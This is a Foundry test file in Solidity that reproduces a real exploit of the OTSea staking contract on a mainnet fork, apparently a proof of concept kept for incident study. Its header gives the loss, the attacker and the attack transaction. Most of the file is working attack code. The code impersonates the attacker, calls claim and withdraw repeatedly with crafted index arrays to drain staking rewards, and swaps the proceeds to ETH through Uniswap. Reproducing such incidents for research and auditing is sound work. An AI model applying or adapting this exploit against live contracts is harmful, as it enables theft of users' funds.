// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;


import "forge-std/Test.sol";
import "../interface.sol";

/*
// @KeyInfo - Total Lost : 26k US$
// Attacker : 0x000000003704BC4ffb86000046721f44Ef3DBABe
// Attack Contract : 0xd11eE5A6a9EbD9327360D7A82e40d2F8C314e985
// Vulnerable Contract : 0xF2c8e860ca12Cde3F3195423eCf54427A4f30916
// Attack Tx : 0x90b4fcf583444d44efb8625e6f253cfcb786d2f4eda7198bdab67a54108cd5f4

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xf2c8e860ca12cde3f3195423ecf54427a4f30916#code

// @Analysis
// Nick Franklin : https://nickfranklin.site/2024/09/13/otsea-staking-hacked/
*/

interface OTSeaRevenueDistributor {
    function distribute() external;
}

interface OTSeaStaking {
    function withdraw(uint256[] calldata _indexes, address _receiver) external;
    function claim(uint256[] calldata _indexes, address _receiver) external;
}

interface IUniswapV2Router01 {
    function WETH() external pure returns (address);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract ContractTest is Test {
    uint256 internal blocknumToForkFrom = 20738191 - 1;
    address internal otseaDist = 0x34BCcF4aF03870265Fe99cEc262524F343Cca7ff;
    address internal attackContract = 0x5AeC8469414332d62Bf5058fb91F2f8457e5C5CB;
    address internal otseaToken = 0x5dA151B95657e788076D04d56234Bd93e409CB09;
    address internal uniswapRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal otseaStaking = 0xF2c8e860ca12Cde3F3195423eCf54427A4f30916;

    function setUp() public {
        vm.createSelectFork("mainnet", blocknumToForkFrom);
        vm.label(otseaDist, "OTSeaRevenueDistributor");
        vm.label(attackContract, "Attacker");
        vm.label(otseaToken, "OTSea: OTSea Token");
        vm.label(uniswapRouter, "Uniswap V2: Router 2");
        vm.label(otseaStaking, "OTSeaStaking");
    }

    function testExploit() public {
        OTSeaRevenueDistributor(otseaDist).distribute();
        vm.startPrank(attackContract);
        for (uint256 i = 0; i < 14; i++) {
            uint256[] memory indexes = new uint256[](21);
            for (uint256 j = 0; j < 20; j++) {
                indexes[j] = j;
            }
            indexes[20] = 20+i;

            OTSeaStaking(otseaStaking).claim(indexes, attackContract);
            OTSeaStaking(otseaStaking).withdraw(indexes, attackContract);
        }
        for (uint256 i = 0; i < 10; i++) {
            uint256[] memory indexes = new uint256[](2);
            for (uint256 j = 0; j < 1; j++) {
                indexes[j] = j;
            }
            indexes[1] = 34+i;

            OTSeaStaking(otseaStaking).claim(indexes, attackContract);
            OTSeaStaking(otseaStaking).withdraw(indexes, attackContract);
        }
        for (uint256 i = 0; i < 22; i++) {
            uint256[] memory indexes = new uint256[](25);
            for (uint256 j = 0; j < 23; j++) {
                indexes[j] = j+20;
            }
            indexes[23] = 70;
            indexes[24] = 43+i;

            OTSeaStaking(otseaStaking).claim(indexes, attackContract);
            OTSeaStaking(otseaStaking).withdraw(indexes, attackContract);
        }
        address weth = IUniswapV2Router02(uniswapRouter).WETH();
        IERC20(otseaToken).approve(uniswapRouter, 6000000000000000000000000);
        address[] memory paths = new address[](2);
        paths[0] = otseaToken;
        paths[1] = weth;
        IUniswapV2Router02(uniswapRouter).swapExactTokensForETHSupportingFeeOnTransferTokens(6000000000000000000000000, 0, paths, attackContract, 1726188611);
        vm.stopPrank();
        uint256 balance = IERC20(otseaToken).balanceOf(attackContract);
        console.log("Attacker earned:", balance);
    }

    receive() external payable {}
}